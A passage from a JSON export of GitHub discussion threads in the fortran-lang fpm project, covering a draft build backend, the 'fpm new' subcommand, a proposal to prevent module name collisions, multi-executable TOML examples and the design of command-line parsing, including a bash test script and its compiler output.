                    "text": "Great work! Thank you.\n\nWhere is the fpm_model module? I couldn't find it (on my phone).\n\u2026\nOn Wed, Aug 26, 2020, at 9:14 AM, Laurence Kedward wrote:\n Opening a draft PR for feedback.\n\n Implements:\n\n  * a rudimentary process for scanning sources and determining\n inter-module dependencies.\n  * a simple fpm backend for building files in correct order\n This is really a minimal working implementation, many places for\n improvement (particularly source parsing),\n but it should now build any stand-alone package that only uses the\n `src` and `app` directories (no subdirectories).\n\n A nice example: fortran `fpm` can now build itself. Run `fpm run --args\n 'build'` with Haskell `fpm`.\n\n Other changes:\n\n  * Moved filesystem and string routines into separate modules for now -\n these will eventually be substituted by stdlib routines.\n Not yet implemented:\n\n  * non-default layouts (requires `fpm.toml`)\n  * fpm model structure\n  * Package layout constraints\n  * Library archiving\n  * Incremental builds\n  * Build output directory\n Tested on Ubuntu Linux (gcc-7.5.0) and MinGW Windows (gcc-8.1.0).\n\n You can view, comment on, or merge this pull request online at:\n\n   #155\n\n Commit Summary\n\n  * Restructure: move some routines out of fpm module.\n  * Use temporary file for directory listing output.\n  * Minor fix: to read_lines subroutine.\n  * Add: Sourcefiles module for processing sources.\n  * Minor fix: to count_rows in filesystem mod.\n  * Add: initial fpm build backend.\n  * Add: initial support for c sources.\n  * Minor fix: add dependency pointer guard.\n File Changes\n\n  * *A* fpm/src/FPM_Backend.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-475cc582fa5d31afd70a27d7efa178df> (49)\n  * *A* fpm/src/FPM_Filesystem.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-051a34076927ef0e96a561c89801de72> (125)\n  * *A* fpm/src/FPM_Sourcefiles.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-7e8ed2fd5212f618126c139653c2f364> (375)\n  * *A* fpm/src/FPM_Strings.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-e1790889afd1b0c2e62f82231394fa23> (195)\n  * *M* fpm/src/environment.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-32b40b492690c8c8294e981a0fb78e70> (14)\n  * *M* fpm/src/fpm.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-e235e41ae1a801d1ff11bfa3aa1ea6db> (134)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/155.patch\n  * https://github.com/fortran-lang/fpm/pull/155.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#155>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH4WICQDIJWIZZH6DDSCURF5ANCNFSM4QL6FSFA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-27 01:59:46+00:00",
                    "text": "Yep, @certik is correct. It looks like the fpm_model module got missed with the commits"
                },
                {
                    "user": "certik",
                    "date": "2020-08-27 04:35:16+00:00",
                    "text": "That was the most important module I wanted to look at. ;)\n\u2026\nOn Wed, Aug 26, 2020, at 7:59 PM, Brad Richardson wrote:\n\n\n Yep, @certik <https://github.com/certik> is correct. It looks like the\n `fpm_model` module got missed with the commits\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#155 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH7POTCLAX6LUPAVHDSCW4Z7ANCNFSM4QL6FSFA>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-27 12:03:30+00:00",
                    "text": "Yep, @certik is correct. It looks like the fpm_model module got missed with the commits\n\nSorry yes, I'll push an update later that works with an initial fpm_model structure (it only has the dependency structure in currently).\nI don't mind use M_Strings as a dependency or keeping it self-contained for now - @certik do you have an opinion on this?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-02 03:50:40+00:00",
                    "text": "@LKedward do you want to finish this PR, so that others can build upon it once it is merged?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-02 10:57:57+00:00",
                    "text": "I've added fpm_ prefix to all modules as discussed and implemented a minimal structure for fpm_model, currently with hard-coded values - I think this should be refined in a separate PR. For now I've left the string routines in.\nCurrently having issues building with Haskell fpm which is causing CI to fail, but otherwise I think this is ready for review.\nIf necessary, I'm happy to rebase this PR after #157 is merged."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:19:20+00:00",
                    "text": "I reviewed in more detail and I think this is good to go. I also made the following changes:\n\nExplicit imports with use ..., only: ...\nExplicitly list public names with the public statement\nRemove a few unused module imports\n\nThere are no semantic changes to the code."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 15:45:44+00:00",
                    "text": "Many thanks Milan! I'll be sure to follow those guidelines in future."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:50:24+00:00",
                    "text": "@LKedward I don't think we even had these in the style guide but I think we should."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-07 09:31:43+00:00",
                    "text": "I've now successfully merged in the recent changes so that fortran fpm can now build slightly more complex packages like the hello_complex example package. This is enough for this PR, so I won't be contributing any more of my own changes to this branch unless requested."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-08 11:01:27+00:00",
                    "text": "Many thanks for the helpful review comments @awvwgk, I've addressed all except the exit codes - am I misunderstanding you here?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-08 11:43:13+00:00",
                    "text": "@LKedward I did a bit of further testing and actually trying to break the implementation, see #167, the report is regarding bootstrap fpm but is also not working well with this PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-11 15:38:22+00:00",
                    "text": "Thanks for the review @certik, I've implemented your suggestions for isolating the model definition from the frontend."
                },
                {
                    "user": "certik",
                    "date": "2020-09-11 15:42:21+00:00",
                    "text": "Thanks. Looks good now. +1 to merge\n\u2026\nOn Fri, Sep 11, 2020, at 9:38 AM, Laurence Kedward wrote:\n\n\n Thanks for the review @certik <https://github.com/certik>, I've\n implemented your suggestions for isolating the model definition from\n the frontend.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#155 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHWQ4NDOV6BSDJ35ETSFJAAFANCNFSM4QL6FSFA>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-11 20:19:39+00:00",
                    "text": "@everythingfunctional Please merge when ready, in case you're still reviewing."
                }
            ]
        },
        {
            "number": 154,
            "user": "milancurcic",
            "date": "2020-08-20 18:00:00+00:00",
            "title": "Implement fpm new",
            "text": "Should be a low-hanging fruit and easy project.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-08-31 03:09:17+00:00",
                    "text": "I tried implementing the command line parsing I could discern from the Haskell fpm(1) using a parsing module I have and implemented the \"fpm new\" subcommand trying to stay true to the current structure of the fpm Fortran skeleton. I also had it ech the parsed arguments in the unimplimented commands.  I could not get this to push out put I have not done that all that many times so if anyone is interested in that  clone https://github.com/urbanjost/M_CLI2.git and ignore the rest of it but just look in the fpm.cli/ directory."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-08 00:23:36+00:00",
                    "text": "I put a branch on called urbanjost that has a \"new\" subcommand. Lots of questions about what it should do when given an existing directory, like an existing github repository you want to convert to use fpm(1); to test it I added a CLI interface and did some tweeking of the \"run\" and \"build\" subcommands, but just minimal enough to run the output from a \"new\" subcommand\" and a simple project with no dependencies. It also allows for an \"-- options\" instead of -args \" options\". The biggest issues are how to implement MKDIR, CHDIR, and GETCWD. CHDIR and GETCWD exist as extensions in gfortran, for example. I used some existing POSIX-like interfaces I had, but that limits portability unless similar functions are added to stdlib. Thought it would be useful for discussing how it should best be implimented. So I guess it gets into #135, #138, as well as #154 all in\n#159.  No smarts about the order of compilation or pulling packages/ dependencies but at least it actually lets you try out a \"new\" command concept. I was thinking maybe a -license switch might be nice for common licenses; and was thinking the default README.md might include links to the fpm page and maybe  some other links as a more complete example of a markdown file, but unless a specific platform like github was selected I am not sure the markdown syntax between repositories is standardized enough to do that. Anyway, learned some things about how to use the TOML interface. Hope this might be useful for discussion. When it is done, fpm(1) is going to be an interesting code. There are enough interesting problems there just getting it to the state of the Haskell prototype that I might actually look at the Haskell code out of curiosity to see how it was done. Anyway, I find coded examples a good way to discuss potential solutions, so thought this would work as a way to discuss some possible approaches for this. Apparently the CLI is going to be done using other approaches, but if there is any interest I think this is actually a full implementation of the CLI (Cocmmand Line Interface)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 02:17:04+00:00",
                    "text": "Were you saying you wanted to implement this or that you think it is a good candidate for early implimentation?\nI have some ideas on how I would want it to act with an extension to how it works with an existing directory for someone migrating to supporting fpm. I would like to put it in as a draft on the PR page or discuss some of it with you if you are working on it."
                },
                {
                    "user": "certik",
                    "date": "2020-09-24 03:28:00+00:00",
                    "text": "Are you asking Milan?\n\nIn general I would say go ahead and implement things. If you open a PR with an early implementation, everybody can collaborate there.\n\u2026\nOn Wed, Sep 23, 2020, at 8:17 PM, urbanjost wrote:\n\n\n Were you saying you wanted to implement this or that you think it is a\n good candidate for early implimentation?\n I have some ideas on how I would want it to act with an extension to\n how it works with an existing directory for someone migrating to\n supporting fpm. I would like to put it in as a draft on the PR page or\n discuss some of it with you if you are working on it.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#154 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWHWTCJQKZEJOEKZUMLSHKT23ANCNFSM4QGN4EIA>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-24 04:01:48+00:00",
                    "text": "@urbanjost sorry that I wasn't clear. I'm not working on it and I'm happy that you are. I agree with Ondrej, considering that fpm new has a simple and well defined API, you can go ahead with the PR."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 06:18:16+00:00",
                    "text": "Great. I will create a PR called \"NEW\". Unfortunately, I will have to include the PR \"CLI\" to have a model that can implement the \"new\" subcommand; which is not yet approved. Perhaps I should just delete \"CLI\" and do \"NEW\"?\nSomething weird is happening with the MSWindows build of \"CLI\" to boot; but I think I can do \"NEW\" and probably \"RUN\" pretty quickly far enough and I think others can extend \"build\" and should have pretty complete \"new\",\"run\" . I am going to add a --list option to \"run\" for discussion about using such as option for piping into a command like GNU/Linux xargs(1) command and/or creating a --mask to make it easier to use fpm(1) with other utilitilies. On Linux I might want to have a way to use gdb, valgrind, maybe profiling ?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-24 08:13:26+00:00",
                    "text": "Perhaps I should just delete \"CLI\" and do \"NEW\"?\n\nIf possible I would prefer that we keep the \"CLI\" pull request so that it can be reviewed separately."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 00:33:44+00:00",
                    "text": "Started a NEW before I saw this post. Have had some issues with the CLI PR building that @everythingfunctional seems to have been resolved and exposed an issue with quoting of arguments containing spaces after the -- argument, but if I get that sorted out I have a prototype for NEW that builds, runs, and tests. This bash(1) script actually ran with just the Fortran code and I think it will run or test a Haskell fpm directory too, which was a pleasant surprise. I pretty much just copied some of the lines from the build command and made a few guesses. Not like it pulls remote repositories and builds them or does a topological sort and builds in the right order or anything; but I hope this is a step forward. If you play with it it raises some interesting questions about what a new command should do in an existing directory, if a new pathname can be a full pathname, if you should be able to ask for a new setup that is any of the prototypes on the web page, whether an option to write some of the common LICENSE files would be useful -- I think there are some good discussions there just using this basic PR.\n#!/bin/bash\n##################################################\n(\nexec &2>1\nset -x -v\nfpm-new new asdf --with-executable --with-test\ncd asdf\nfpm-new build\nfpm-new run\nfpm-new test\nfpm-new run --list\nfpm-new test --list\nfpm-new run --list --release\nfpm-new test --list --release\nfpm-new build --release\nfpm-new run --list --release\nfpm-new test --list --release\n)|tee -a $0\n##################################################\nexit\n\nmkdir -p asdf\ncd asdf\nmkdir -p asdf/src\nfpm::new asdf/src/asdf.f90 already exists. Not overwriting\nfpm::new asdf/.gitignore already exists. Not overwriting\nfpm::new asdf/README.md already exists. Not overwriting\nmkdir -p asdf/test\nfpm::new asdf/test/main.f90 already exists. Not overwriting\nmkdir -p asdf/app\nfpm::new asdf/app/main.f90 already exists. Not overwriting\nfpm::new asdf/fpm.toml already exists. Not overwriting\ncd asdf;git init\nReinitialized existing Git repository in /tmp/asdf/.git/\ngfortran -c src/asdf.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/asdf/asdf.f90.o\ngfortran -c app/main.f90  -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/app/main.o\ngfortran build/gfortran_debug/app/main.o  build/gfortran_debug/asdf/asdf.f90.o  -o build/gfortran_debug/app/asdf\ngfortran -c test/main.f90  -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/test/main.o\ngfortran build/gfortran_debug/test/main.o  build/gfortran_debug/asdf/asdf.f90.o  -o build/gfortran_debug/test/runTests\nbuild/gfortran_debug/app/asdf\nHello, asdf!\nbuild/gfortran_debug/test/runTests\nPut some tests in here!\nfpm::run:executable expected at build/gfortran_debug/app/asdf exists\nfpm::run:test expected at build/gfortran_debug/test/runTests exists\nfpm::run:executable expected at build/gfortran_release/app/asdf exists\nfpm::run:test expected at build/gfortran_release/test/runTests exists\ngfortran -c src/asdf.f90  -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/asdf/asdf.f90.o\ngfortran -c app/main.f90   -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/app/main.o\ngfortran build/gfortran_release/app/main.o  build/gfortran_release/asdf/asdf.f90.o  -o build/gfortran_release/app/asdf\ngfortran -c test/main.f90   -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/test/main.o\ngfortran build/gfortran_release/test/main.o  build/gfortran_release/asdf/asdf.f90.o  -o build/gfortran_release/test/runTests\nfpm::run:executable expected at build/gfortran_release/app/asdf exists\nfpm::run:test expected at build/gfortran_release/test/runTests exists\n\nIf the CLI PR gets OKed I will merge NEW into a new PR I guess. I could pull this back but if anyone has some time to preview it I am curious about what anyone thinks.  I am hoping this can actually complete #154 sans some of the new questions it raises actually being able to try it."
                }
            ]
        },
        {
            "number": 153,
            "user": "everythingfunctional",
            "date": "2020-08-17 18:48:04+00:00",
            "title": "Prevent Name Collisions Between Packages",
            "text": "In #86, it became clear that we'd like a solution to prevent name collisions of modules between packages. Starting this thread here to discuss solutions.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 19:03:45+00:00",
                    "text": "My preferred solution would just be that all modules in a library must start with the name of the library. Thus, you may have a module that is just the same name as the library. This is likely to be a common design; organize your library however you like, expose the public API via a module with the same name as the library."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 19:28:02+00:00",
                    "text": "I agree, I think this is the way to go.\nStructuring the module and file names as we did so far helps emulate namespaces and subpackages, but I don't see a good reason to enforce it. The user can still do it if they prefer."
                },
                {
                    "user": "certik",
                    "date": "2020-08-17 20:06:40+00:00",
                    "text": "Here is the \"minimal\" proposal:\nAll module names must start with the library name, in particular the module name should be equal to:\n\neither the library name and underscore, such as stdlib_* or toml_*\nor just the library name, such as stdlib or toml\n\nDo we all agree with this \"minimal\" proposal?\nI do. If we all do, we have something to solve our immediate problem, which is name collisions between packages. This gives us time to discuss naming conventions, which I think is important to have, but that's a separate issue."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-18 07:46:44+00:00",
                    "text": "I agree, this is a good solution."
                }
            ]
        },
        {
            "number": 152,
            "user": "urbanjost",
            "date": "2020-08-15 19:11:15+00:00",
            "title": "examples with multiple executables and tests",
            "text": "I had created fpm.toml files that worked, but apparently were not correct toml files. With help from @LKedward I changed my list of executables to an array in several fpm.toml files which now passes tests as standard toml and still works; but when I try the same syntax with multiple test programs my tests are ignored. It is probably something simple but it took me a while just trying empirically to get everything running initially with multiple programs (realizing each one had to be in a seperate directory and so on). I was thinking I am not the only one likely to have these problems and that a more extensive example on this site showing the proper/preferred way to have multiple test programs and application executables would help avoid the problem and give me a solution. The first use I have made of TOML is for these fpm files so even if I get something to work I am not particularly confident it will be the \"right\" way.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-08-16 00:01:54+00:00",
                    "text": "Thanks for reporting the issue. I agree we need better examples and tests.\n\u2026\nOn Sat, Aug 15, 2020, at 1:11 PM, urbanjost wrote:\n\n\n I had created fpm.toml files that worked, but apparently were not\n correct toml files. With help from @LKedward\n <https://github.com/LKedward> I changed my list of executables to an\n array in several fpm.toml files which now passes tests as standard toml\n and still works; but when I try the same syntax with multiple test\n programs my tests are ignored. It is probably something simple but it\n took me a while just trying empirically to get everything running\n initially with multiple programs (realizing each one had to be in a\n seperate directory and so on). I was thinking I am not the only one\n likely to have these problems and that a more extensive example on this\n site showing the proper/preferred way to have multiple test programs\n and application executables would help avoid the problem and give me a\n solution. The first use I have made of TOML is for these fpm files so\n even if I get something to work I am not particularly confident it will\n be the \"right\" way.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#152>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEU6LBNIZHITWNKGL3SA3MV5ANCNFSM4QANIPSQ>."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-08-16 08:56:56+00:00",
                    "text": "I have the same set-up for the collection of modules I called \"pointsets\" -\nwith each test program in a separate directory, but the sources for the\nmodules in one and the same source directory. This works fine. If you need\nan example (for at least the current way), you could use that.\n\nRegards,\n\nArjen\n\nOp zo 16 aug. 2020 om 02:02 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Thanks for reporting the issue. I agree we need better examples and tests.\n\n On Sat, Aug 15, 2020, at 1:11 PM, urbanjost wrote:\n >\n >\n > I had created fpm.toml files that worked, but apparently were not\n > correct toml files. With help from @LKedward\n > <https://github.com/LKedward> I changed my list of executables to an\n > array in several fpm.toml files which now passes tests as standard toml\n > and still works; but when I try the same syntax with multiple test\n > programs my tests are ignored. It is probably something simple but it\n > took me a while just trying empirically to get everything running\n > initially with multiple programs (realizing each one had to be in a\n > seperate directory and so on). I was thinking I am not the only one\n > likely to have these problems and that a more extensive example on this\n > site showing the proper/preferred way to have multiple test programs\n > and application executables would help avoid the problem and give me a\n > solution. The first use I have made of TOML is for these fpm files so\n > even if I get something to work I am not particularly confident it will\n > be the \"right\" way.\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#152>, or unsubscribe\n > <\n https://github.com/notifications/unsubscribe-auth/AAAFAWEU6LBNIZHITWNKGL3SA3MV5ANCNFSM4QANIPSQ\n >.\n >\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#152 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7XA2AUSRXNZTVPFC3SA4OX5ANCNFSM4QANIPSQ>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-16 09:27:20+00:00",
                    "text": "when I try the same syntax with multiple test programs my tests are ignored.\n\nHi @urbanjost, this may be a subtle problem with the ordering of your fpm.toml file - does the inline array definition of test come after any previous (non-inline) array definition such as [[library]] or [[executable]], if so then the resulting data structure will have test as a sub-member of the previous definition and will hence be ignored at the top-level. This is IMO, an unfortunate subtlety of how Array of tables are defined in toml."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-08-16 19:06:01+00:00",
                    "text": "That was the major problem! Thanks. Still tweeking it but this particular module is primarily an interface to C POSIX routines. It is at least working again; although still tweeking it.\ngit clone https://github.com/urbanjost/M_system.git\n\n >>fpm.toml <<\n [dependencies]\n M_system        = { git = \"https://github.com/urbanjost/M_system.git\" }\n\nStill think some vetted examples here would be useful, of course."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 10:10:17+00:00",
                    "text": "Still think some vetted examples here would be useful, of course.\n\nAgreed. It would also be useful to mention the alternative compact notation for array-of-tables - useful for multiple executables/tests - and the above limitation."
                }
            ]
        },
        {
            "number": 151,
            "user": "everythingfunctional",
            "date": "2020-07-31 00:14:46+00:00",
            "title": "Refactor to make it easier to start developing the command line aspects",
            "text": "I'm proposing this as the start of the design for the command line aspects. I'm thinking I'll go ahead and start developing a command line parsing library, but the rest of the application doesn't need to know anything about it this way.\nUnfortunately, this makes fpm incapable of building itself now. Should we start hard-coding some stuff to at least keep that working?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-31 17:12:47+00:00",
                    "text": "It's basically just not doing anything to figure what order it needs to build the modules. Hardcoding it would be a short term solution, but will very quickly become a mess."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-31 17:27:44+00:00",
                    "text": "I looked more closely at FLAP. I really like the API, as it follows pretty closely the Python argparse library. However, it has a few limitations that I think rule it out.\n\nIt's licensed under GPLv3, which (I believe) is incompatible with fpm's MIT license\nIt doesn't support being built with fpm, and doesn't look very easy to convert (due to next issue)\nIt has several external dependencies that are managed as git submodules (a significant issue for bringing in as an fpm package)\nIt doesn't (seem to) support trailing, pass-through arguments (i.e. fpm run -- args to executable)\n\nI'm going to try and implement a very similar API, and will probably look at it for inspiration, but I just don't think it is the right solution for fpm right now"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-31 17:34:46+00:00",
                    "text": "Okay, I think I understand now. It's Fortran fpm that is trying to build itself in CI.\nI agree that we aim for this to work, but it seems to me a strange requirement to have right now. Fortran fpm conforms to the fpm package rules, but Fortran fpm does not have fpm build implemented to follow these rules. It seems to me like the wrong requirement to chase in this PR.\nInstead, I propose that:\n\nThe Fortran fpm test in CI should be to simply build the example project (generated by Haskell fpm new).\nTo pass the test the above, we need to either expand Haskell's fpm new to add a bare-bones app/main.f90, or only build the module in Fortran fpm build\n\n@certik does this seem like a reasonable compromise?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-31 17:40:38+00:00",
                    "text": "Brad, we discussed this a bit in #135. License is a non-issue (FLAP is multi-licensed). Your other bullets are real issues. However, nothing's stopping us from forking the project and pulling in the external dependencies. It could all be fpm-ized in a day, but no point in doing so until we are sure it's the road we want to take. I think it's too early to tell."
                },
                {
                    "user": "certik",
                    "date": "2020-07-31 18:15:27+00:00",
                    "text": "It's fine I guess if it can't build itself. It currently runs some tests, and we should add a few more to test it a bit."
                },
                {
                    "user": "certik",
                    "date": "2020-08-01 03:55:13+00:00",
                    "text": "I checked the tests, they seem to work. The Fortran FPM is tested on the simple hello world example, so I think we are in good shape and I merged it. I personally prefer more procedural approaches than the OO approach, but let's just try it, and we can refactor later if we decide in the future."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-01 02:42:32+00:00",
                    "text": "I implimented the parsing using M_CLI2 and added enough (Posix-dependent) system routines to impliment the \"new\" subcommand in https://github.com/urbanjost/M_CLI2.git in the subdirectory fpm.cli.  It also parses the other commands but does not do anything new with them other than echo the argument values to show the CLI parsing is working. Implimenting the \"new\" command was just to demonstrate the parsing, but if some can add equivalent routines for the mkdir,chdir,perror for other systems it would be portable, as the CLI interface is all Fortran. If this looks like it is sufficient details like completing the help text, etc. will be completed but I did not want to go much further if no concensus that this is sufficient is forthcoming. I have a basic Fortran-based utility for creating a basic Make file that could be used to do the builds (on systems with make) but  not much need to do step two if step one is not going to work out. Could not get a git request to work so it is not a pull request, just some files to replace fpm/src. If good enough feel free to move it to the git repository."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-01 06:42:52+00:00",
                    "text": "That should be doable with the stdlib_os module from stdlib. (I do not see\nit in the repository yet, though)\n\n\n\nOp di 1 sep. 2020 om 04:42 schreef urbanjost <notifications@github.com>:\n\u2026\n I implimented the parsing using M_CLI2 and added enough (Posix-dependent)\n system routines to impliment the \"new\" subcommand in\n https://github.com/urbanjost/M_CLI2.git in the subdirectory fpm.cli. It\n also parses the other commands but does not do anything new with them other\n than echo the argument values to show the CLI parsing is working.\n Implimenting the \"new\" command was just to demonstrate the parsing, but if\n some can add equivalent routines for the mkdir,chdir,perror for other\n systems it would be portable, as the CLI interface is all Fortran. If this\n looks like it is sufficient details like completing the help text, etc.\n will be completed but I did not want to go much further if no concensus\n that this is sufficient is forthcoming. I have a basic Fortran-based\n utility for creating a basic Make file that could be used to do the builds\n (on systems with make) but not much need to do step two if step one is not\n going to work out. Could not get a git request to work so it is not a pull\n request, just some files to replace fpm/src. If good enough feel free to\n move it to the git repository.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#151 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR63AYZUHKSKKG4MK7LSDRNSLANCNFSM4PO67LMQ>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 15:00:34+00:00",
                    "text": "Thanks @urbanjost! I think Brad is working on CLI parsing for fpm. @everythingfunctional, if you have any work done, can you push it to a branch on your fork so that @urbanjost can coordinate with you? If not, should we review @urbanjost's implementation?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 15:02:38+00:00",
                    "text": "@arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-01 17:11:34+00:00",
                    "text": "@milancurcic and @urbanjost , I'm currently working on a command line library that supports a more declarative style, and isn't hardwired to interrogating the real command line (i.e. calling get_command_argument). I haven't made a ton of progress yet, but you can check it out here.\nThe reason to do it this way, is it will make it possible to unit test the command line aspects, without needing external testing scripts, including how erroneous commands are handled. For example it becomes possible to write a unit test like, \"if a name for the new package isn't passed to the new command, an error is reported\", as well as \"if the '--with-test' flag is passed to the new command, the returned settings object has the with_test component set to true\", all without any connection to any I/O."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 17:46:54+00:00",
                    "text": "That sounds good to me. IMO the CLI stuff is not as high priority as stdlib_os so we can take some time to carefully design it. In the interim, Fortran intrinsics can get us by."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-02 00:20:39+00:00",
                    "text": "There are five command line parsers in my \"General Purpose Fortran\" repository. Like what you are proposing M_kracken can process arbitrary strings as well as the command line arguments, as it was was originally created as part of a Fortran-based shell and was not even used for command line parsing; M_CLI2 only does command line parsing by default, but was derived from a more general utility that allowed for the prototype parser to be called twice instead of calling the prototype parser and then the command line parser, but to truly test program execution the unit test program calls the test program recursively and does not need any external scripts to do do; albeit it builds a command stack and if that got big enough you could run out of process space. So you can write a Fortran code that tests the command line parser by actually calling it that does not require an external script. Between the M_system Posix interface and M_CLI/M_args/M_kracken/M_getopts/M_getopts_long/M_CLI2 command line crackers and M_io and M_debug/M_journal/M_msg unit testing modules and the regular expression routines and the make-file maker \"makeout\" all the parts except the toml reader and curl interface exist in that collection; except that the OS interface is POSIX-only so I have only used it in CygWin on a PC; but the general concensus here seemed to be to wait for the stdlib routines of the same or similar function to be developed so I did not see that an fpm using those would be acceptable. But M_CLI2 seemed a very good fit for the CLI interface module the Haskell fpm(1) model so I put together that code which I believe emulates all the current fpm(1) CLI interface plus allows for using -- instead of --args and allows for seperate help for each subcommand and I think is very easy to understand (usage requires one call per subcommand to set up the command options and parse the command line and then at a maxiumum a call to get_args for each keyword plus optional use of the array unnamed and string variable remaining for unassociated arguments on the command line.\nSo as an alternative you might look at the test program for the M_CLI2 module for how to test a command line parser by actually calling the program recursively.\nAlso, M_CLI2 has a routine in it for parsing a prototype string, but it does not behave exactly like calling the command line would (the string delimiter must be a double-quote, etc...).\nWe crossed paths apparently in that when I started that I did not see (or missed) that anyone was implementing a CLI interface and thought I would do it quickly enought that it would not needed announced until I had something working.\nMurphy;s Law at work, I suppose."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-02 09:25:46+00:00",
                    "text": "Hi Milan, Martin,\n\nI checked my notes, there were a few things that did not quite work:\nThey concern details of how Windows works (drives as a separate part\nof the file name), the MinGW environment posed some issues etc.\nAlso the test program is a trifle unixy - \"/home\", \"/bin\" are\ndirectories not normally encountered on Windows. So, yes, this\nrequires some attention. The basics work.\nI will pick this up in the coming few days.\n\nRegards,\n\nArjen\n\nOp di 1 sep. 2020 om 17:02 schreef Milan Curcic <notifications@github.com>:\n\u2026\n\n @arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:37:13+00:00",
                    "text": "@urbanjost , it sounds like I need to take some time to go and look at your libraries in more detail. If that all works we may be able to get the Fortran version of fpm working a lot faster than I thought."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-03 19:08:48+00:00",
